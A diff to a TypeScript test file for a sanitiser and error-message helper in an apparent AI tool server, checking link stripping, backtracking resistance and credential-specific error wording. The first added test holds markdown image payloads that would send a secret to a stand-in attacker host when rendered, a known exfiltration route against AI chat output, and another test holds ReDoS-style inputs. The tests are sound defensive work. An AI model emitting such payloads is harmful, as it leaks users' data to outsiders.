@@ -14,6 +14,23 @@ describe('untrusted', () => {
     expect(untrusted(null)).toBe('');
   });
 
+  it('leaves no image or link behind when they are nested, and cleaning twice changes nothing', () => {
+    const markdownLink = /!?\[[^\]]*\]\(/;
+    for (const hostile of [
+      '[![x](a)](https://evil.example/p.png?d=SECRET)',
+      '[![](x)](https://evil/q)',
+      'before [![x](a)](https://evil.example/p.png?d=SECRET) after',
+      '[[[a](b)](c)](https://evil/deep)',
+      '<[a](x)b>[![](y)](https://evil/r)',
+    ]) {
+      const once = untrusted(hostile);
+      expect(once, hostile).not.toMatch(markdownLink);
+      expect(once, hostile).not.toContain('evil');
+      expect(untrusted(once), hostile).toBe(once);
+    }
+    expect(untrusted('before [![x](a)](https://evil.example/p.png?d=SECRET) after')).toBe('before after');
+  });
+
   it('caps the length with an ellipsis', () => {
     const out = untrusted('x'.repeat(1000), 50);
     expect(out).toHaveLength(50);
@@ -22,7 +39,7 @@ describe('untrusted', () => {
 
   it('stays fast on input built to make a backtracking pattern slow', () => {
     const started = Date.now();
-    for (const hostile of ['['.repeat(100_000), '<'.repeat(100_000), '[a]('.repeat(30_000), '!['.repeat(50_000)]) {
+    for (const hostile of ['['.repeat(100_000), '<'.repeat(100_000), '[a]('.repeat(30_000), '!['.repeat(50_000), `${'[!['.repeat(30_000)}x${'](a)](b)'.repeat(30_000)}`]) {
       untrusted(hostile, 500);
     }
     expect(Date.now() - started).toBeLessThan(500);
@@ -53,6 +70,22 @@ describe('toFailure', () => {
     expect(f.message).toContain('- (arguments) [invalid_type]');
   });
 
+  it('sends the model to get_form_guide only for a form config', () => {
+    const refusal = () =>
+      new BackendError(400, 'VALIDATION_FAILED', 'Invalid.', [
+        { path: 'radius', message: 'Invalid enum value.', code: 'invalid_enum_value' },
+        { path: 'shade', message: 'Unrecognized key.', code: 'unrecognized_keys' },
+      ]);
+    for (const tool of ['update_brand_kit', 'update_form_notification', 'set_destinations', undefined]) {
+      expect(toFailure(refusal(), 'key', tool).render(), String(tool)).not.toContain('get_form_guide');
+    }
+    for (const tool of ['create_form', 'update_form']) {
+      const text = toFailure(refusal(), 'key', tool).render();
+      expect(text).toMatch(/get_form_guide\.$/);
+      expect(text).toContain('config_schema of get_form_guide');
+    }
+  });
+
   it('lists at most 25 issues and says how many were left out', () => {
     const issues = Array.from({ length: 30 }, (_, i) => ({ path: `config.steps.${i}.question`, message: 'Required', code: 'invalid_type' }));
     const text = renderIssues(issues);
@@ -66,9 +99,36 @@ describe('toFailure', () => {
     expect(limited.render()).toContain('Retry after 7s.');
     expect(toFailure(new BackendError(401, 'INVALID_API_KEY', 'This API key is not valid.')).render()).toContain('new key');
     expect(toFailure(new BackendError(409, 'SLUG_TAKEN', 'Taken.')).render()).toContain('another slug');
+    const gone = toFailure(new BackendError(401, 'MEMBER_NOT_ACTIVE', 'You are no longer an active member of this workspace.')).render();
+    expect(gone).toMatch(/^MEMBER_NOT_ACTIVE: You are no longer an active member of this workspace\. /);
+    expect(gone).toContain('list_my_workspaces');
     expect(toFailure(new BackendError(503, 'UNAVAILABLE', 'Storage down, host db-7')).render()).not.toContain('db-7');
     expect(toFailure(new Error('boom')).code).toBe('INTERNAL_ERROR');
     const own = new ToolFailure('X', 'y');
     expect(toFailure(own)).toBe(own);
+  });
+});
+
+describe('toFailure, by credential', () => {
+  it('speaks of the key to an API key and of the member to a signed-in person', () => {
+    // What the model is told, past the stable code.
+    const said = (f: ToolFailure) => `${f.message} ${f.hint ?? ''}`;
+    const key = 'key' as const;
+    const person = 'connection' as const;
+    const forbidden = new BackendError(403, 'FORBIDDEN', 'You need the admin role.');
+    expect(toFailure(forbidden, key).render()).toMatch(/key's owner/);
+    const forbiddenPerson = said(toFailure(forbidden, person));
+    expect(forbiddenPerson).not.toMatch(/key/i);
+    expect(forbiddenPerson).toMatch(/owner or admin/);
+
+    const dead = new BackendError(401, 'INVALID_API_KEY', 'This API key is not valid.');
+    expect(toFailure(dead, key).render()).toContain('new key');
+    const deadPerson = said(toFailure(dead, person));
+    expect(deadPerson).not.toMatch(/key/i);
+    expect(deadPerson).toMatch(/connect/i);
+
+    const limited = new BackendError(429, 'RATE_LIMITED', 'Slow down.', [], { retryAfterSec: 3 });
+    expect(toFailure(limited, key).render()).toMatch(/API key/);
+    expect(said(toFailure(limited, person))).not.toMatch(/key/i);
   });
 });
